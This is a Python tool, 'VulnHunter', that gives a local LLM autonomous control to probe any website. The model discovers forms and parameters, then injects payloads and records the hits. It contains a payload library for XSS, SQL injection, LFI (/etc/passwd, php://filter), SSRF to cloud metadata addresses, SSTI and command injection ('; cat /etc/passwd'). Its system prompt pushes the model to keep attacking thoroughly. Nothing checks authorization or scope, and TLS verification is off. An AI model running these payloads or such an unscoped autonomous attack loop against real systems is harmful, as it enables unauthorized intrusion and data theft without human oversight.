#!/usr/bin/env python3
"""
VulnHunter Framework - Full LLM-Controlled Bug Hunting

The LLM has FULL control:
- Send any HTTP request
- Fetch forms, links, source code
- Craft payloads based on responses
- Search the internet
- Exploit and confirm vulnerabilities
"""

import re
import json
import asyncio
import aiohttp
import time
import sys
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, quote
from typing import Dict, List, Optional, Any
from datetime import datetime

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False

try:
    import ollama
    OLLAMA_AVAILABLE = True
except ImportError:
    OLLAMA_AVAILABLE = False
    print("Install ollama: pip install ollama")

console = Console() if RICH_AVAILABLE else None


class WebClient:
    """HTTP client for the LLM to use"""
    
    def __init__(self, timeout: int = 15):
        self.timeout = aiohttp.ClientTimeout(total=timeout)
        self.cookies = {}
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        }
        self.request_count = 0
    
    async def request(self, method: str, url: str, 
                      headers: Optional[Dict] = None,
                      data: Optional[Dict] = None,
                      params: Optional[Dict] = None) -> Dict:
        """Make HTTP request"""
        self.request_count += 1
        start = time.time()
        
        req_headers = {**self.headers, **(headers or {})}
        
        try:
            async with aiohttp.ClientSession(timeout=self.timeout, cookies=self.cookies) as session:
                async with session.request(
                    method, url,
                    headers=req_headers,
                    data=data,
                    params=params,
                    ssl=False,
                    allow_redirects=True
                ) as resp:
                    body = await resp.text()
                    
                    # Save cookies
                    for cookie in resp.cookies.values():
                        self.cookies[cookie.key] = cookie.value
                    
                    return {
                        "success": True,
                        "url": str(resp.url),
                        "status": resp.status,
                        "headers": dict(resp.headers),
                        "body": body,
                        "length": len(body),
                        "time": round(time.time() - start, 2),
                        "cookies": dict(resp.cookies)
                    }
        except Exception as e:
            return {
                "success": False,
                "url": url,
                "error": str(e)
            }
    
    def run(self, coro):
        """Run async code"""
        try:
            loop = asyncio.get_event_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        return loop.run_until_complete(coro)


class Tools:
    """
    Tools the LLM can use
    Each tool returns a string result
    """
    
    def __init__(self):
        self.client = WebClient()
        self.findings = []
        self.target = ""
        self.discovered = {
            "forms": [],
            "links": [],
            "params": [],
            "endpoints": [],
            "technologies": []
        }
    
    # ========== HTTP TOOLS ==========
    
    def get(self, url: str) -> str:
        """GET request"""
        result = self.client.run(self.client.request("GET", url))
        if result["success"]:
            return json.dumps({
                "url": result["url"],
                "status": result["status"],
                "length": result["length"],
                "time": result["time"],
                "headers": {k: v for k, v in result["headers"].items() 
                           if k.lower() in ["server", "x-powered-by", "content-type", "set-cookie"]},
                "body": result["body"][:5000] + ("..." if len(result["body"]) > 5000 else "")
            }, indent=2)
        return json.dumps({"error": result.get("error")})
    
    def post(self, url: str, data: str) -> str:
        """POST request with form data"""
        try:
            form_data = json.loads(data) if isinstance(data, str) else data
        except:
            form_data = {"data": data}
        
        result = self.client.run(self.client.request("POST", url, data=form_data))
        if result["success"]:
            return json.dumps({
                "url": result["url"],
                "status": result["status"],
                "length": result["length"],
                "body": result["body"][:5000]
            }, indent=2)
        return json.dumps({"error": result.get("error")})
    
    def request(self, method: str, url: str, headers: str = "", data: str = "") -> str:
        """Custom HTTP request"""
        try:
            hdrs = json.loads(headers) if headers else None
            body = json.loads(data) if data else None
        except:
            hdrs = None
            body = None
        
        result = self.client.run(self.client.request(method.upper(), url, headers=hdrs, data=body))
        if result["success"]:
            return json.dumps({
                "url": result["url"],
                "status": result["status"],
                "length": result["length"],
                "body": result["body"][:5000]
            }, indent=2)
        return json.dumps({"error": result.get("error")})
    
    # ========== DISCOVERY TOOLS ==========
    
    def find_forms(self, url: str) -> str:
        """Find all forms on a page"""
        result = self.client.run(self.client.request("GET", url))
        if not result["success"]:
            return json.dumps({"error": result.get("error")})
        
        html = result["body"]
        forms = []
        
        for match in re.finditer(r'<form([^>]*)>(.*?)</form>', html, re.I | re.S):
            attrs, content = match.groups()
            
            action = re.search(r'action=["\']([^"\']*)["\']', attrs)
            method = re.search(r'method=["\']([^"\']*)["\']', attrs)
            
            inputs = []
            for inp in re.finditer(r'<input([^>]*)/?>', content, re.I):
                inp_attrs = inp.group(1)
                name = re.search(r'name=["\']([^"\']*)["\']', inp_attrs)
                inp_type = re.search(r'type=["\']([^"\']*)["\']', inp_attrs)
                value = re.search(r'value=["\']([^"\']*)["\']', inp_attrs)
                if name:
                    inputs.append({
                        "name": name.group(1),
                        "type": inp_type.group(1) if inp_type else "text",
                        "value": value.group(1) if value else ""
                    })
            
            for ta in re.finditer(r'<textarea[^>]*name=["\']([^"\']*)["\']', content, re.I):
                inputs.append({"name": ta.group(1), "type": "textarea"})
            
            for sel in re.finditer(r'<select[^>]*name=["\']([^"\']*)["\']', content, re.I):
                inputs.append({"name": sel.group(1), "type": "select"})
            
            if inputs:
                form = {
                    "action": urljoin(url, action.group(1)) if action else url,
                    "method": method.group(1).upper() if method else "GET",
                    "inputs": inputs
                }
                forms.append(form)
                self.discovered["forms"].append(form)
        
        return json.dumps({"forms": forms, "count": len(forms)}, indent=2)
    
    def find_links(self, url: str) -> str:
        """Find all internal links"""
        result = self.client.run(self.client.request("GET", url))
        if not result["success"]:
            return json.dumps({"error": result.get("error")})
        
        html = result["body"]
        base_netloc = urlparse(url).netloc
        links = set()
        params = set()
        
        for href in re.findall(r'href=["\']([^"\']+)["\']', html, re.I):
            if href.startswith('#') or href.startswith('javascript:') or href.startswith('mailto:'):
                continue
            full = urljoin(url, href.split('#')[0])
            if urlparse(full).netloc == base_netloc:
                links.add(full)
                # Extract params
                for p in parse_qs(urlparse(full).query):
                    params.add(p)
        
        self.discovered["links"].extend(list(links)[:50])
        self.discovered["params"].extend(list(params))
        
        return json.dumps({
            "links": list(links)[:30],
            "total_links": len(links),
            "parameters": list(params)
        }, indent=2)
    
    def read_source(self, url: str) -> str:
        """Read full HTML source"""
        result = self.client.run(self.client.request("GET", url))
        if not result["success"]:
            return f"Error: {result.get('error')}"
        
        return f"=== SOURCE CODE ({result['length']} bytes) ===\n{result['body']}"
    
    def find_endpoints(self, url: str) -> str:
        """Find API endpoints in JavaScript"""
        result = self.client.run(self.client.request("GET", url))
        if not result["success"]:
            return json.dumps({"error": result.get("error")})
        
        html = result["body"]
        endpoints = set()
        
        # Find URLs in scripts
        patterns = [
            r'["\'](/api/[^"\']+)["\']',
            r'["\'](/v\d+/[^"\']+)["\']',
            r'fetch\(["\']([^"\']+)["\']',
            r'axios\.[a-z]+\(["\']([^"\']+)["\']',
            r'\.ajax\(\{[^}]*url:\s*["\']([^"\']+)["\']',
        ]
        
        for pattern in patterns:
            for match in re.finditer(pattern, html, re.I):
                ep = match.group(1)
                if not ep.startswith('http'):
                    ep = urljoin(url, ep)
                endpoints.add(ep)
        
        self.discovered["endpoints"].extend(list(endpoints))
        
        return json.dumps({"endpoints": list(endpoints)}, indent=2)
    
    def detect_tech(self, url: str) -> str:
        """Detect technologies"""
        result = self.client.run(self.client.request("GET", url))
        if not result["success"]:
            return json.dumps({"error": result.get("error")})
        
        html = result["body"].lower()
        headers = result["headers"]
        techs = []
        
        # From headers
        server = headers.get("Server", headers.get("server", ""))
        powered = headers.get("X-Powered-By", headers.get("x-powered-by", ""))
        
        if "nginx" in server.lower(): techs.append("nginx")
        if "apache" in server.lower(): techs.append("apache")
        if "php" in powered.lower(): techs.append("php")
        if "asp.net" in powered.lower(): techs.append("asp.net")
        if "express" in powered.lower(): techs.append("node.js/express")
        
        # From HTML
        if "wp-content" in html: techs.append("wordpress")
        if "jquery" in html: techs.append("jquery")
        if "react" in html or "_react" in html: techs.append("react")
        if "vue" in html or "v-model" in html: techs.append("vue")
        if "angular" in html or "ng-" in html: techs.append("angular")
        if "__viewstate" in html: techs.append("asp.net")
        if "csrftoken" in html or "csrf_token" in html: techs.append("csrf-protected")
        if "laravel" in html: techs.append("laravel")
        if "django" in html: techs.append("django")
        
        self.discovered["technologies"] = techs
        
        return json.dumps({"technologies": techs}, indent=2)
    
    # ========== TESTING TOOLS ==========
    
    def inject(self, url: str, param: str, payload: str) -> str:
        """Inject payload into parameter"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        
        result = self.client.run(self.client.request("GET", test_url))
        
        if not result["success"]:
            return json.dumps({"error": result.get("error")})
        
        body = result["body"]
        
        return json.dumps({
            "url": test_url,
            "param": param,
            "payload": payload,
            "status": result["status"],
            "reflected": payload in body,
            "length": len(body),
            "body_preview": body[:3000]
        }, indent=2)
    
    def post_inject(self, url: str, data: str, field: str, payload: str) -> str:
        """Inject payload into POST field"""
        try:
            form_data = json.loads(data)
        except:
            form_data = {}
        
        form_data[field] = payload
        
        result = self.client.run(self.client.request("POST", url, data=form_data))
        
        if not result["success"]:
            return json.dumps({"error": result.get("error")})
        
        return json.dumps({
            "url": url,
            "field": field,
            "payload": payload,
            "status": result["status"],
            "reflected": payload in result["body"],
            "length": result["length"],
            "body_preview": result["body"][:3000]
        }, indent=2)
    
    # ========== SEARCH TOOLS ==========
    
    def search_cve(self, technology: str) -> str:
        """Search for CVEs for a technology"""
        search_url = f"https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword={quote(technology)}"
        result = self.client.run(self.client.request("GET", search_url))
        
        if not result["success"]:
            return json.dumps({"error": "Search failed", "suggestion": f"Search manually: {search_url}"})
        
        # Extract CVE IDs
        cves = re.findall(r'(CVE-\d{4}-\d+)', result["body"])
        unique_cves = list(set(cves))[:10]
        
        return json.dumps({
            "technology": technology,
            "cves_found": unique_cves,
            "search_url": search_url
        }, indent=2)
    
    def search_exploit(self, query: str) -> str:
        """Search for exploits"""
        search_url = f"https://www.exploit-db.com/search?q={quote(query)}"
        
        return json.dumps({
            "query": query,
            "search_url": search_url,
            "note": "Visit the URL to find exploits, or search GitHub for POCs"
        }, indent=2)
    
    # ========== PAYLOAD GENERATION ==========
    
    def get_payloads(self, vuln_type: str) -> str:
        """Get payloads for a vulnerability type"""
        payloads = {
            "xss": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                "'><script>alert(1)</script>",
                "\"><img src=x onerror=alert(1)>",
                "'-alert(1)-'",
                "${alert(1)}",
                "{{constructor.constructor('alert(1)')()}}",
            ],
            "sqli": [
                "'",
                "\"",
                "' OR '1'='1",
                "' OR 1=1--",
                "\" OR 1=1--",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "1' AND '1'='1",
                "1' AND '1'='2",
                "'; WAITFOR DELAY '0:0:5'--",
                "' AND SLEEP(5)--",
            ],
            "lfi": [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "/etc/passwd",
                "..\\..\\..\\windows\\win.ini",
                "php://filter/convert.base64-encode/resource=index.php",
                "file:///etc/passwd",
            ],
            "ssrf": [
                "http://127.0.0.1",
                "http://localhost",
                "http://[::1]",
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/",
                "file:///etc/passwd",
            ],
            "ssti": [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "#{7*7}",
                "*{7*7}",
                "{{config}}",
                "{{self.__class__.__mro__}}",
            ],
            "cmd": [
                "; id",
                "| id",
                "& id",
                "`id`",
                "$(id)",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
            ]
        }
        
        return json.dumps({
            "type": vuln_type,
            "payloads": payloads.get(vuln_type.lower(), [])
        }, indent=2)
    
    # ========== REPORTING ==========
    
    def report(self, vuln_type: str, url: str, param: str, payload: str, evidence: str, severity: str) -> str:
        """Report a confirmed vulnerability"""
        finding = {
            "type": vuln_type,
            "url": url,
            "param": param,
            "payload": payload,
            "evidence": evidence,
            "severity": severity,
            "timestamp": datetime.now().isoformat()
        }
        self.findings.append(finding)
        
        return json.dumps({
            "status": "VULNERABILITY RECORDED",
            "finding": finding
        }, indent=2)
    
    def get_findings(self) -> str:
        """Get all findings"""
        return json.dumps({"findings": self.findings, "count": len(self.findings)}, indent=2)
    
    def summary(self) -> str:
        """Get hunt summary"""
        return json.dumps({
            "target": self.target,
            "requests_made": self.client.request_count,
            "forms_found": len(self.discovered["forms"]),
            "links_found": len(self.discovered["links"]),
            "params_found": len(self.discovered["params"]),
            "endpoints_found": len(self.discovered["endpoints"]),
            "technologies": self.discovered["technologies"],
            "vulnerabilities": len(self.findings),
            "findings": self.findings
        }, indent=2)


class VulnHunter:
    """
    Main hunter - LLM controls everything
    """
    
    def __init__(self, model: str):
        self.model = model
        self.tools = Tools()
        self.conversation = []
        
        self.system_prompt = """You are an expert bug bounty hunter. You have REAL tools to test websites.

## YOUR TOOLS

You can call tools by writing: [TOOL: tool_name(arg1, arg2)]

### HTTP Tools:
- [TOOL: get(url)] - GET request, returns response
- [TOOL: post(url, data)] - POST request, data is JSON like {"user": "test"}
- [TOOL: request(method, url, headers, data)] - Custom request

### Discovery Tools:
- [TOOL: find_forms(url)] - Find all forms and inputs
- [TOOL: find_links(url)] - Find internal links and parameters
- [TOOL: read_source(url)] - Read full HTML source
- [TOOL: find_endpoints(url)] - Find API endpoints in JavaScript
- [TOOL: detect_tech(url)] - Detect technologies

### Testing Tools:
- [TOOL: inject(url, param, payload)] - Inject payload into URL parameter
- [TOOL: post_inject(url, data, field, payload)] - Inject into POST field

### Research Tools:
- [TOOL: search_cve(technology)] - Search CVEs for technology
- [TOOL: search_exploit(query)] - Search for exploits
- [TOOL: get_payloads(type)] - Get payloads (xss, sqli, lfi, ssrf, ssti, cmd)

### Reporting:
- [TOOL: report(type, url, param, payload, evidence, severity)] - Report vulnerability
- [TOOL: get_findings()] - See all findings
- [TOOL: summary()] - Get hunt summary

## HOW TO HUNT

1. Start with discovery: find_forms, find_links, detect_tech
2. Analyze what you find - look for interesting parameters
3. Get appropriate payloads: get_payloads("xss") or get_payloads("sqli")
4. Test with inject() or post_inject()
5. Check if "reflected": true or look for errors
6. If vulnerable, confirm and report with report()

## EXAMPLE

[TOOL: find_forms(https://target.com)]
Result shows form with "search" input...

[TOOL: get_payloads(xss)]
Get XSS payloads...

[TOOL: inject(https://target.com/search?q=test, q, <script>alert(1)</script>)]
Check if reflected is true...

If vulnerable:
[TOOL: report(XSS, https://target.com/search, q, <script>alert(1)</script>, Payload reflected in HTML, high)]

## RULES
1. ALWAYS use tools - don't just describe, actually test
2. Analyze responses carefully
3. Try multiple payloads if first doesn't work
4. Only report CONFIRMED vulnerabilities with evidence
5. Be thorough - test all parameters"""

    def parse_tool_calls(self, text: str) -> List[Dict]:
        """Parse tool calls from LLM response"""
        calls = []
        
        # Regex to find [TOOL: followed by tool name
        import re
        pattern = r'\[TOOL:\s*(\w+)\s*\('
        
        for match in re.finditer(pattern, text, re.IGNORECASE):
            tool_name = match.group(1)
            start_idx = match.end()  # Position after the (
            
            # Find matching ) - track parenthesis depth
            depth = 1
            i = start_idx
            while i < len(text) and depth > 0:
                if text[i] == '(':
                    depth += 1
                elif text[i] == ')':
                    depth -= 1
                i += 1
            
            args_str = text[start_idx:i-1]
            
            # Parse arguments - split by comma but respect quotes and braces
            args = []
            current = ""
            in_quotes = False
            quote_char = None
            brace_depth = 0
            
            for char in args_str + ",":
                if char in "\"'" and not in_quotes:
                    in_quotes = True
                    quote_char = char
                elif char == quote_char and in_quotes:
                    in_quotes = False
                elif char == "{":
                    brace_depth += 1
                elif char == "}":
                    brace_depth -= 1
                elif char == "," and not in_quotes and brace_depth == 0:
                    arg = current.strip().strip("\"'")
                    if arg:
                        args.append(arg)
                    current = ""
                    continue
                current += char
            
            calls.append({"tool": tool_name.lower(), "args": args})
        
        return calls
    
    def execute_tool(self, name: str, args: List[str]) -> str:
        """Execute a tool"""
        try:
            if name == "get":
                return self.tools.get(args[0] if args else self.tools.target)
            elif name == "post":
                return self.tools.post(args[0], args[1] if len(args) > 1 else "{}")
            elif name == "request":
                return self.tools.request(args[0], args[1], args[2] if len(args) > 2 else "", args[3] if len(args) > 3 else "")
            elif name == "find_forms":
                return self.tools.find_forms(args[0] if args else self.tools.target)
            elif name == "find_links":
                return self.tools.find_links(args[0] if args else self.tools.target)
            elif name == "read_source":
                return self.tools.read_source(args[0] if args else self.tools.target)
            elif name == "find_endpoints":
                return self.tools.find_endpoints(args[0] if args else self.tools.target)
            elif name == "detect_tech":
                return self.tools.detect_tech(args[0] if args else self.tools.target)
            elif name == "inject":
                return self.tools.inject(args[0], args[1], args[2])
            elif name == "post_inject":
                return self.tools.post_inject(args[0], args[1], args[2], args[3])
            elif name == "search_cve":
                return self.tools.search_cve(args[0])
            elif name == "search_exploit":
                return self.tools.search_exploit(args[0])
            elif name == "get_payloads":
                return self.tools.get_payloads(args[0])
            elif name == "report":
                return self.tools.report(args[0], args[1], args[2], args[3], args[4], args[5])
            elif name == "get_findings":
                return self.tools.get_findings()
            elif name == "summary":
                return self.tools.summary()
            else:
                return json.dumps({"error": f"Unknown tool: {name}"})
        except Exception as e:
            return json.dumps({"error": f"Tool error: {str(e)}"})
    
    def chat(self, message: str) -> str:
        """Chat with LLM and execute tools"""
        self.conversation.append({"role": "user", "content": message})
        
        messages = [
            {"role": "system", "content": self.system_prompt},
            *self.conversation
        ]
        
        try:
            response = ollama.chat(model=self.model, messages=messages)
            reply = response['message']['content']
            
            # Parse and execute tool calls
            tool_calls = self.parse_tool_calls(reply)
            
            if tool_calls:
                results = []
                for call in tool_calls:
                    result = self.execute_tool(call["tool"], call["args"])
                    results.append(f"[{call['tool']}] Result:\n{result}")
                
                # Add response and results to conversation
                self.conversation.append({"role": "assistant", "content": reply})
                
                # Continue with tool results
                results_text = "\n\n".join(results)
                return self.chat(f"Tool results:\n\n{results_text}\n\nAnalyze these results and continue hunting. If you found vulnerabilities, report them. What's next?")
            
            self.conversation.append({"role": "assistant", "content": reply})
            return reply
            
        except Exception as e:
            return f"Error: {e}"
    
    def start(self, url: str) -> str:
        """Start hunting"""
        self.tools.target = url
        
        return self.chat(f"""I need you to hunt for vulnerabilities on: {url}

Start by discovering the attack surface:
1. Find all forms and inputs
2. Find internal links and parameters
3. Detect technologies used

Then test for vulnerabilities:
- XSS in all text inputs
- SQLi in ID/numeric parameters
- LFI in file parameters
- SSRF in URL parameters

Use the tools! Start now with:
[TOOL: find_forms({url})]
[TOOL: find_links({url})]
[TOOL: detect_tech({url})]""")


def get_models() -> List[str]:
    """Get available Ollama models"""
    if not OLLAMA_AVAILABLE:
        return []
    try:
        models = ollama.list()
        return [m['name'] for m in models.get('models', [])]
    except:
        return []


def select_model() -> str:
    """Select model interactively"""
    models = get_models()
    
    if not models:
        print("No Ollama models found. Make sure Ollama is running.")
        return input("Enter model name: ").strip() or "llama3.1:8b"
    
    if console:
        table = Table(title="Available Models")
        table.add_column("#", style="cyan")
        table.add_column("Model", style="green")
        for i, m in enumerate(models, 1):
            table.add_row(str(i), m)
        console.print(table)
        choice = Prompt.ask("Select model", default="1")
    else:
        print("\nAvailable Models:")
        for i, m in enumerate(models, 1):
            print(f"  {i}. {m}")
        choice = input("Select (number or name): ").strip()
    
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(models):
            return models[idx]
    except:
        if choice in models:
            return choice
    
    return models[0] if models else "llama3.1:8b"


def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="VulnHunter - AI Bug Bounty Framework")
    parser.add_argument('url', nargs='?', help='Target URL')
    parser.add_argument('-m', '--model', help='Ollama model')
    args = parser.parse_args()
    
    # Banner
    banner = """
╔═══════════════════════════════════════════════════════════════╗
║   VulnHunter Framework - Full AI Control                      ║
║   The LLM drives everything: requests, analysis, exploits     ║
╚═══════════════════════════════════════════════════════════════╝
"""
    if console:
        console.print(banner, style="bold cyan")
    else:
        print(banner)
    
    # Get URL
    url = args.url or input("Enter target URL: ").strip()
    if not url:
        print("No URL provided")
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    # Get model
    if args.model:
        model = args.model
    else:
        model = select_model()
    
    print(f"\nTarget: {url}")
    print(f"Model: {model}")
    print("\nStarting autonomous hunt...\n")
    
    hunter = VulnHunter(model=model)
    
    # Start hunting
    response = hunter.start(url)
    
    if console:
        console.print(Panel(response, title="🔍 AI Hunter", border_style="cyan"))
    else:
        print(f"\n{'='*60}\n{response}\n{'='*60}\n")
    
    # Interactive loop
    print("\nCommands: 'c'=continue, 'r'=report, 'q'=quit, or type instructions")
    
    while True:
        try:
            cmd = input("\n> ").strip()
        except (KeyboardInterrupt, EOFError):
            break
        
        if cmd.lower() == 'q':
            print(hunter.tools.summary())
            break
        elif cmd.lower() == 'r':
            print(hunter.tools.summary())
        elif cmd.lower() == 'c':
            response = hunter.chat("Continue hunting. Test more parameters, try different payloads, explore more pages.")
        else:
            response = hunter.chat(cmd)
        
        if console and 'response' in dir():
            console.print(Panel(response, title="🔍 AI Hunter", border_style="cyan"))
        elif 'response' in dir():
            print(f"\n{response}\n")
    
    print("\n=== Hunt Complete ===")
    print(f"Requests made: {hunter.tools.client.request_count}")
    print(f"Vulnerabilities found: {len(hunter.tools.findings)}")


if __name__ == "__main__":
    main()
